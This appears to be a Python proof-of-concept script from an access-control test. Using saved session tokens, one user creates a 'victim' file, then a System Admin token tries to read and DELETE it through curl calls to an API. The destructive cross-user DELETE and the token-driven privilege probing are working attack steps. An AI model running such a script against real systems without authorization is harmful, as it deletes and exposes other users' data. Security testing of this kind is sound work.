import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TR2=open('/tmp/tok_R2-301').read().strip()
TB=open('/tmp/tok_B-230').read().strip()
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','90','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or TR2),'-H',BB,'-H','Content-Type: application/json']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='zx'+uuid.uuid4().hex[:8]
print("=== STEP 1: B(230, Owner) creates a file ===")
c,b=req('POST','/api/v1/attachments/html',
        {"html":f"<h1>ZX-R2-VICTIM-{tag}</h1>","type":"word",
         "attachableType":"AuditableEntity","attachableId":"98","fileName":f"zx-{tag}-R2VICTIM"},tok=TB)
print(f"  gen -> {c} {b[:130].replace(chr(10),' ')}")
if c!='200': raise SystemExit("no victim file")
aid=json.loads(b)['attachmentId']
c,b=req('GET',f'/api/v1/attachments/{aid}',tok=TB)
fid=json.loads(b)['attachments'][0]['file_id']
print(f"  attachment={aid} file_id={fid} (owned by 230)")
print("\n=== STEP 2: control - B reads own file ===")
c,_=req('GET',f'/api/v1/files/{fid}',tok=TB); print(f"  B GET -> {c}")
print("\n=== STEP 3: role-2 (System Admin) tries to READ Owner's file ===")
c,b=req('GET',f'/api/v1/files/{fid}',tok=TR2)
print(f"  R2 GET -> {c} {b[:150].replace(chr(10),' ')}")
print("\n=== STEP 4: role-2 tries to DELETE Owner's file ===")
c,b=req('DELETE',f'/api/v1/files/{fid}',tok=TR2)
print(f"  R2 DELETE -> {c} {b[:220].replace(chr(10),' ')}")
print("\n=== STEP 5: verify (B reads back) ===")
c,b=req('GET',f'/api/v1/files/{fid}',tok=TB)
print(f"  B GET -> {c} {b[:200].replace(chr(10),' ')}")
open('/tmp/r2_fid','w').write(str(fid))
